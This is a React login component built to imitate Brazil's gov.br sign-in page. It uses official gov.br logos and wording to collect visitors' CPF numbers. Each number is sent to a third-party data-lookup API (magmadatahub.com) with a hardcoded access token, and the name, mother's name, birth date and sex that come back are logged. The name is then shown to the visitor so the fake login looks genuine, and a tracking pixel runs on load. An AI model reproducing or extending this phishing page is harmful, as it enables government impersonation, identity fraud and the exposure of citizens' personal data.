import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useUser } from '../context/UserContext';
import { usePixelTracking } from '../hooks/usePixelTracking';
import axios from 'axios';

interface UserInfo {
  cpf: string;
  nome: string;
  nome_mae: string;
  data_nascimento: string;
  sexo: string;
}

const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?: UserInfo }> => {
  const numericCPF = cpf.replace(/\D/g, "");

  if (numericCPF.length !== 11) {
    return { valid: false };
  }

  if (/^(\d)\1{10}$/.test(numericCPF)) {
    return { valid: false };
  }

  let sum = 0;
  for (let i = 0; i < 9; i++) {
    sum += parseInt(numericCPF.charAt(i)) * (10 - i);
  }
  let digit1 = 11 - (sum % 11);
  if (digit1 > 9) digit1 = 0;

  sum = 0;
  for (let i = 0; i < 10; i++) {
    sum += parseInt(numericCPF.charAt(i)) * (11 - i);
  }
  let digit2 = 11 - (sum % 11);
  if (digit2 > 9) digit2 = 0;

  if (parseInt(numericCPF.charAt(9)) !== digit1 || parseInt(numericCPF.charAt(10)) !== digit2) {
    return { valid: false };
  }

  try {
    const response = await axios.get(
      `https://magmadatahub.com/api.php?token=bef7dbfe0994308f734fbfb4e2a0dec17aa7baed9f53a0f5dd700cf501f39f26&cpf=${numericCPF}`,
      { timeout: 8000 }
    );

    console.log('Resposta da API de Login:', response.data);

    const body = response.data;

    if (body?.status === 'error' || body?.error) {
      console.warn('CPF API: erro retornado', body);
      return { valid: true };
    }

    // Trata diferentes formatos de resposta da API
    let dados = body?.DADOS || body?.dados || body?.data;
    
    if (!dados && Array.isArray(body) && body.length > 0) {
      dados = body[0];
    }
    
    if (!dados && body?.nome) {
      dados = body;
    }

    if (dados && dados.nome) {
      return {
        valid: true,
        data: {
          cpf: dados.cpf || dados.CPF || numericCPF,
          nome: dados.nome || dados.NOME || "",
          nome_mae: dados.nome_mae || dados.MAE || "",
          data_nascimento: dados.data_nascimento || dados.DATA_NASCIMENTO || "",
          sexo: dados.sexo || dados.SEXO || ""
        }
      };
    }
  } catch (error) {
    console.error('Erro ao consultar API de CPF:', error);
  }

  return { valid: true };
};

const Login: React.FC = () => {
  usePixelTracking();
  
  const [cpf, setCpf] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const navigate = useNavigate();
  const { setUserName } = useUser();

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 3) return numbers;
    if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
    if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
    return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedCPF = formatCPF(e.target.value);
    if (formattedCPF.length <= 14) {
      setCpf(formattedCPF);
      setError('');
    }
  };

  const handleContinue = async () => {
    if (cpf.length < 14) {
      setError('Digite um CPF válido');
      return;
    }

    setLoading(true);
    setError('');

    try {
      const result = await validateCPFFromAPI(cpf);

      if (!result.valid) {
        setError('CPF inválido');
        return;
      }

      if (result.data) {
        setUserName(result.data.nome);
      }

      navigate('/');
    } catch (error) {
      setError('Erro ao validar CPF. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100" style={{ fontFamily: 'Rawline, sans-serif', lineHeight: 1.5 }}>
      {/* Header (gov.br image + icons) */}
      <header style={{ background: '0px 0px no-repeat padding-box padding-box rgb(255, 255, 255)', display: 'flex', flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', boxShadow: 'rgba(0, 0, 0, 0.16) 0px 3px 6px', marginBottom: '6px', width: '100%', padding: '0px 10px' }}>
        <div></div>
        <a href="#" style={{ color: 'rgb(51, 51, 51)', fontSize: '0.9em', fontWeight: 500, textDecoration: 'none' }}>
          <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Gov.br" style={{ width: '100px', margin: '10px' }} />
        </a>
        <div className="flex gap-4">
          <i className="fas fa-moon text-base text-blue-600"></i>
          <i className="fas fa-cookie-bite text-base text-blue-600"></i>
        </div>
      </header>

      <div className="container mx-auto p-8" style={{ margin: '0px auto auto' }}>
        <div className="flex justify-center">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg shadow-md p-[10px]">
              <h2 className="text-lg font-semibold mb-4 text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '15px' }}>Identifique-se no gov.br com:</h2>

              <div className="flex items-center mb-2">
                <img className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png" alt="CPF" />
                <span className="text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>Número do CPF</span>
              </div>

              <p className="text-gray-600 text-sm mb-4" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>Digite seu CPF para <span className="font-semibold">criar</span> ou <span className="font-semibold">acessar</span> sua conta gov.br</p>

              <div>
                <label htmlFor="cpf" className="block text-[#333333] text-sm font-bold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>CPF</label>
                <input id="cpf" inputMode="numeric" placeholder="Digite seu CPF" className="shadow text-[0.8em] text-[#333333] h-[36px] appearance-none border rounded w-full py-2 px-3 leading-tight" maxLength={14} type="text" value={cpf} onChange={handleCPFChange} style={{ fontFamily: 'Rawline, sans-serif', padding: '0px 20px', width: '100%', background: '0px 0px no-repeat padding-box padding-box rgb(255, 255, 255)', border: '1px solid rgb(136, 136, 136)', borderRadius: '4px', color: 'rgb(51, 51, 51)' }} />
              </div>

              {error && (
                <div className="mt-3 p-3 bg-red-50 border border-red-200 text-red-700 rounded text-sm">
                  {error}
                </div>
              )}

              <button disabled={loading || cpf.replace(/\D/g, '').length < 11} onClick={handleContinue} className="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 text-primary-foreground hover:bg-primary/90 h-10 w-full py-2 px-4 rounded focus:outline-none focus:shadow-outline font-bold cta-button-primary" style={{ fontFamily: 'Rawline, sans-serif', boxShadow: 'rgba(0, 0, 0, 0.16) 0px 2px 3px', borderRadius: '24px', opacity: (loading || cpf.replace(/\D/g, '').length < 11) ? 0.5 : 1, margin: '30px 0px 25px', backgroundColor: '#1351B4' }}>
                {loading ? 'Validando...' : 'Continuar'}
              </button>

              <p className="text-[#333333] text-sm font-semibold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>Outras opções de identificação:</p>
              <hr className="text-[#333333]" />

              <div className="space-y-2">
                <div className="login-option flex items-center cursor-pointer rounded transition-colors duration-300" style={{ marginTop: '20px' }}>
                  <img alt="Internet Banking" className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png" />
                  <div className="flex items-center">
                    <span className="text-green-700 text-xs">Login com seu banco</span>
                    <span className="ml-2 bg-green-700 text-white text-xs px-1 py-0.5 uppercase font-bold" style={{ fontSize: '8px' }}>SUA CONTA SERÁ PRATA</span>
                  </div>
                </div>

                <div className="flex items-center cursor-pointer" style={{ marginTop: '20px' }}>
                  <img className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/app-identidade-govbr.png" alt="App Gov.br" />
                  <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>Seu aplicativo gov.br</span>
                </div>

                <div className="flex items-center cursor-pointer" style={{ marginTop: '20px' }}>
                  <img className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png" alt="Certificado Digital" />
                  <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>Seu certificado digital</span>
                </div>

                <div className="flex items-center cursor-pointer" style={{ marginTop: '20px' }}>
                  <img className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" alt="Certificado Digital em Nuvem" />
                  <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>Seu certificado digital em nuvem</span>
                </div>
              </div>

            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
